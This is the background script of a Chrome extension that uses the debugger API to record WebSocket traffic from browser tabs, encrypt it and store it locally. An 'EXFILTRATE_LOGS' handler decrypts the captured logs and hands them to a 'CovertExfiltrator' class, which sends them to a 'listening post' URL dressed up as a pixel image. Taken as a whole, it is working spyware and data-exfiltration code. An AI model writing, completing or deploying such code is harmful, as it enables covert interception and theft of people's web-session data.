import { encryptAndSave, fetchDecryptedHistory, clearVault } from './vault.js';
        import { CovertExfiltrator } from './covert.js';

        const attachedTabs = new Set();
        const LISTENING_POST_URL = "http://127.0.0.1:5000/pixel.png"; 

        // 1. Click Icon -> Start Recording
        chrome.action.onClicked.addListener((tab) => {
          if (!tab.id || tab.url.startsWith('chrome://')) return;
          attachDebugger(tab.id);
        });

        // 2. Command -> Toggle UI
        chrome.commands.onCommand.addListener(async (command) => {
          if (command === "toggle-ui") {
            const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
            if (!tab || !tab.id || tab.url.startsWith("chrome://")) return;

            const history = await fetchDecryptedHistory();
            try {
              await chrome.tabs.sendMessage(tab.id, { action: "TOGGLE_OVERLAY", data: history });
            } catch (err) {
              await chrome.scripting.executeScript({ target: { tabId: tab.id }, files: ['content.js'] });
              setTimeout(() => {
                chrome.tabs.sendMessage(tab.id, { action: "TOGGLE_OVERLAY", data: history });
              }, 100);
            }
          }
        });

        // 3. Messages
        chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
          if (msg.action === "CLEAR_VAULT") {
            clearVault().then(() => sendResponse({ status: 'cleared' }));
            return true; 
          }
          if (msg.action === "EXFILTRATE_LOGS") {
            (async () => {
              const logs = await fetchDecryptedHistory();
              const payload = logs.map(l => l.text).join(" || ");
              const transmitter = new CovertExfiltrator(LISTENING_POST_URL);
              transmitter.transmit(payload); 
            })();
            sendResponse({ status: 'transmission_started' });
          }
        });

        function attachDebugger(tabId) {
          if (attachedTabs.has(tabId)) return;
          chrome.debugger.attach({ tabId }, "1.3", () => {
            if (chrome.runtime.lastError) return;
            attachedTabs.add(tabId);
            chrome.debugger.sendCommand({ tabId }, "Network.enable");
            chrome.action.setBadgeText({ tabId, text: "REC" });
            chrome.action.setBadgeBackgroundColor({ tabId, color: "#10b981" });
          });
        }

        chrome.debugger.onEvent.addListener(async (source, method, params) => {
          if (method === "Network.webSocketFrameReceived") {
            const payload = params.response.payloadData;
            if (!payload || payload.length < 5) return;
            try {
              const tab = await chrome.tabs.get(source.tabId).catch(() => null);
              if (tab) {
                await encryptAndSave(payload, tab.url, source.tabId);
                chrome.action.setBadgeText({ tabId: source.tabId, text: "SAV" });
                setTimeout(() => chrome.action.setBadgeText({ tabId: source.tabId, text: "REC" }), 500);
              }
            } catch (err) {}
          }
        });

        chrome.debugger.onDetach.addListener((source) => {
          attachedTabs.delete(source.tabId);
          chrome.action.setBadgeText({ tabId: source.tabId, text: "" });
        });